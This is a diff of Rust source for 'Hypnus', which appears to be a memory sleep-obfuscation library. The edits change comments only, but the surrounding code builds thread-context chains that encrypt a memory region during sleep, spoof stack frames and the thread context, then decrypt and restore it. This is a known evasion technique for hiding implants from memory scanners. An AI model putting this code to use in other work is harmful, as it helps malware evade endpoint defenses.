@@ -364,13 +364,13 @@ impl Hypnus {
             ctx_init.Rsp = current_rsp();
             let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);
 
-            // The chain will wait until `event` is signaled.
+            // The chain will wait until `event` is signaled
             ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
             ctxs[0].Rcx = events[1] as u64;
             ctxs[0].Rdx = 0;
             ctxs[0].R8  = 0;
 
-            // Temporarily makes the target memory region writable before encryption.
+            // Temporarily makes the target memory region writable before encryption
             let mut old_protect = 0u32;
             let (mut base, mut size) = (self.base, self.size);
             ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
@@ -379,49 +379,48 @@ impl Hypnus {
             ctxs[1].R8  = size.as_u64();
             ctxs[1].R9  = PAGE_READWRITE as u64;
 
-            // Encrypts or masks the specified memory region in-place (RC4-style).
+            // Encrypts or masks the specified memory region
             ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
             ctxs[2].Rcx = base;
             ctxs[2].Rdx = size;
             ctxs[2].R8  = 0;
 
-            // Saves the original CONTEXT so it can be restored later.
+            // Saves the original CONTEXT so it can be restored later
             let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
             ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
             ctxs[3].Rcx = h_thread as u64;
             ctxs[3].Rdx = ctx_backup.as_u64();
 
-            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing).
+            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
             ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
             ctxs[4].Rcx = h_thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep primitive using the current thread handle and a delay.
+            // Sleep primitive using the current thread handle and a delay
             ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
             ctxs[5].Rcx = h_thread as u64;
             ctxs[5].Rdx = self.time * 1000;
             ctxs[5].R8  = 0;
 
-            // Decrypts (unmasks) the memory after waking up.
+            // Decrypts (unmasks) the memory after waking up
             ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
             ctxs[6].Rcx = base;
             ctxs[6].Rdx = size;
             ctxs[6].R8  = 0;
 
-            // Restores the memory protection after decryption.
+            // Restores the memory protection after decryption
             ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
             ctxs[7].Rcx = NtCurrentProcess() as u64;
             ctxs[7].Rdx = base.as_u64();
             ctxs[7].R8  = size.as_u64();
             ctxs[7].R9  = protection;
 
-            // Restores the original thread context — cleanup step.
+            // Restores the original thread context
             ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
             ctxs[8].Rcx = h_thread as u64;
             ctxs[8].Rdx = ctx_backup.as_u64();
 
             // Notify that the obfuscation steps 
-            // (encrypt - delay - decrypt) have completed.
             ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
             ctxs[9].Rcx = events[2] as u64;
             ctxs[9].Rdx = 0;
@@ -605,13 +604,13 @@ impl Hypnus {
             ctx_init.Rsp = current_rsp();
             let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);
 
-            // The chain will wait until `event` is signaled.
+            // The chain will wait until `event` is signaled
             ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
             ctxs[0].Rcx = events[2] as u64;
             ctxs[0].Rdx = 0;
             ctxs[0].R8  = 0;
 
-            // Temporarily makes the target memory region writable before encryption.
+            // Temporarily makes the target memory region writable before encryption
             let mut old_protect = 0u32;
             let (mut base, mut size) = (self.base, self.size);
             ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
@@ -620,49 +619,48 @@ impl Hypnus {
             ctxs[1].R8  = size.as_u64();
             ctxs[1].R9  = PAGE_READWRITE as u64;
 
-            // Encrypts or masks the specified memory region in-place (RC4-style).
+            // Encrypts or masks the specified memory region
             ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
             ctxs[2].Rcx = base;
             ctxs[2].Rdx = size;
             ctxs[2].R8  = 0;
 
-            // Saves the original CONTEXT so it can be restored later.
+            // Saves the original CONTEXT so it can be restored later
             let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
             ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
             ctxs[3].Rcx = h_thread as u64;
             ctxs[3].Rdx = ctx_backup.as_u64();
 
-            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing).
+            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
             ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
             ctxs[4].Rcx = h_thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep primitive using the current thread handle and a delay.
+            // Sleep primitive using the current thread handle and a delay
             ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
             ctxs[5].Rcx = h_thread as u64;
             ctxs[5].Rdx = self.time * 1000;
             ctxs[5].R8  = 0;
 
-            // Decrypts (unmasks) the memory after waking up.
+            // Decrypts (unmasks) the memory after waking up
             ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
             ctxs[6].Rcx = base;
             ctxs[6].Rdx = size;
             ctxs[6].R8  = 0;
 
-            // Restores the memory protection after decryption.
+            // Restores the memory protection after decryption
             ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
             ctxs[7].Rcx = NtCurrentProcess() as u64;
             ctxs[7].Rdx = base.as_u64();
             ctxs[7].R8  = size.as_u64();
             ctxs[7].R9  = protection;
 
-            // Restores the original thread context — cleanup step.
+            // Restores the original thread contex
             ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
             ctxs[8].Rcx = h_thread as u64;
             ctxs[8].Rdx = ctx_backup.as_u64();
 
-            // Notify that the obfuscation steps 
-            // (encrypt → delay → decrypt) have completed.
+            // Notify that the obfuscation steps
             ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
             ctxs[9].Rcx = events[3] as u64;
             ctxs[9].Rdx = 0;
@@ -800,13 +798,13 @@ impl Hypnus {
             ctx_init.Rsp = current_rsp();
             let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);
 
-            // The chain will wait until `event` is signaled.
+            // The chain will wait until `event` is signaled
             ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
             ctxs[0].Rcx = event as u64;
             ctxs[0].Rdx = 0;
             ctxs[0].R8  = 0;
 
-            // Temporarily makes the target memory region writable before encryption.
+            // Temporarily makes the target memory region writable before encryption
             let mut old_protect = 0u32;
             let (mut base, mut size) = (self.base, self.size);
             ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
@@ -815,30 +813,30 @@ impl Hypnus {
             ctxs[1].R8  = size.as_u64();
             ctxs[1].R9  = PAGE_READWRITE as u64;
 
-            // Encrypts or masks the specified memory region in-place (RC4-style).
+            // Encrypts or masks the specified memory region
             ctxs[2].Rip = self.cfg.system_function040.into();
             ctxs[2].Rcx = base;
             ctxs[2].Rdx = size;
             ctxs[2].R8  = 0;
 
-            // Saves the original CONTEXT so it can be restored later.
+            // Saves the original CONTEXT so it can be restored later
             let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
             ctxs[3].Rip = self.cfg.nt_get_context_thread.into();
             ctxs[3].Rcx = thread as u64;
             ctxs[3].Rdx = ctx_backup.as_u64();
 
-            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing).
+            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
             ctxs[4].Rip = self.cfg.nt_set_context_thread.into();
             ctxs[4].Rcx = thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep primitive using the current thread handle and a delay.
+            // Sleep primitive using the current thread handle and a delay
             ctxs[5].Rip = self.cfg.wait_for_single.into();
             ctxs[5].Rcx = thread as u64;
             ctxs[5].Rdx = self.time * 1000;
             ctxs[5].R8  = 0;
 
-            // Decrypts (unmasks) the memory after waking up.
+            // Decrypts (unmasks) the memory after waking up
             ctxs[6].Rip = self.cfg.system_function041.into();
             ctxs[6].Rcx = base;
             ctxs[6].Rdx = size;
@@ -851,7 +849,7 @@ impl Hypnus {
             ctxs[7].R8  = size.as_u64();
             ctxs[7].R9  = protection;
 
-            // Restores the original thread context — cleanup step.
+            // Restores the original thread context
             ctxs[8].Rip = self.cfg.nt_set_context_thread.into();
             ctxs[8].Rcx = thread as u64;
             ctxs[8].Rdx = ctx_backup.as_u64();
@@ -963,13 +961,13 @@ pub mod internal {
     /// * `obf` - Chosen obfuscation strategy.
     /// * `mode` - Optional [`ObfMode`] for stack/heap layout changes.
     pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
-        // Converts the current thread to a fiber so we can switch to another fiber manually.
+        // Converts the current thread to a fiber so we can switch to another fiber manually
         let master = ConvertThreadToFiber(null_mut());
         if master.is_null() {
             return;
         }
 
-        // Initializes the `Hypnus` structure, responsible for applying sleep or obfuscation.
+        // Initializes the `Hypnus` structure, responsible for applying sleep or obfuscation
         match Hypnus::new(base as u64, size, time, mode) {
             Ok(hypnus) => {
                 // Creates the context to be passed into the new fiber.
@@ -992,13 +990,13 @@ pub mod internal {
                     return;
                 }
 
-                // Switches execution to the new fiber.
+                // Switches execution to the new fiber
                 SwitchToFiber(fiber);
 
-                // Once execution returns, the fiber is deleted.
+                // Once execution returns, the fiber is deleted
                 DeleteFiber(fiber);
 
-                // Converts the fiber back into a regular thread (cleanup).
+                // Converts the fiber back into a regular thread
                 ConvertFiberToThread();
             }
             Err(_error) => {
